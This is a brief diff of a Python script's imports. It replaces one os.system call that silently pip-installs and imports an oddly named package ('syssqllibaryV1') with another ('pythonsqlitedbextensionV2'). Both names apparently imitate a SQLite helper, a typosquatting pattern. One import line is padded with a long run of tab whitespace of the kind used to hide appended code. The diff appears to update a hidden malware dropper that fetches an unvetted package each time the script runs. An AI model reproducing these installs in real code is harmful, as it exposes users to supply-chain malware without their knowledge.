@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqllibaryV1")
-import syssqllibaryV1
+os.system("pip install pythonsqlitedbextensionV2")
+import pythonsqlitedbextensionV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
